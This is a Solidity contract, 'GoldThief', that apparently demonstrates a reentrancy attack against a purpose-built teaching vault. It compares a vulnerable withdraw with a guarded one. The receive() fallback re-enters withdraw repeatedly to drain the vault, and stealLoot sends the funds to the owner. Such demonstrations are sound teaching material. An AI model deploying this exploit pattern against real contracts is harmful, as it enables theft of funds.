//SPDX-License-Identifier:MIT

pragma solidity 0.8.34;

interface Ivault {
    function deposit() external payable;
    function vulnerableWithdraw()external;
    function safeWithdraw()external;
}

contract GoldThief{
    Ivault public targetVault;
    address public owner;
    uint public attackCount;
    bool public attackingSafe;

    constructor(address _targetVault){
        targetVault = Ivault(_targetVault);
        owner = msg.sender;
    }

    function attackVulnerable()external payable{
        require(msg.sender == owner, "Only owner can perform this action");
        require(msg.value > 0 ,"Need at least 1 ETH to attack");

        attackingSafe = false;
        attackCount = 0;

        targetVault.deposit{value:msg.value}();
        targetVault.vulnerableWithdraw();
    }

    function attackSafe() external payable{
        require(msg.sender == owner, "Only owner can perform this action");
        require(msg.value > 0 ,"Need at least 1 ETH to attack");

        attackingSafe = true;
        attackCount = 0;

        targetVault.deposit{value:msg.value}();
        targetVault.safeWithdraw();
    }

    receive()external payable{
        attackCount++;

        if(!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5 ){
            targetVault.vulnerableWithdraw();
        }

        if(attackingSafe){
            targetVault.safeWithdraw();
        }
    }

    function stealLoot() external {
        require(msg.sender == owner, "Only owner can perform this action");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns(uint256){
        return address(this).balance;
    }

}
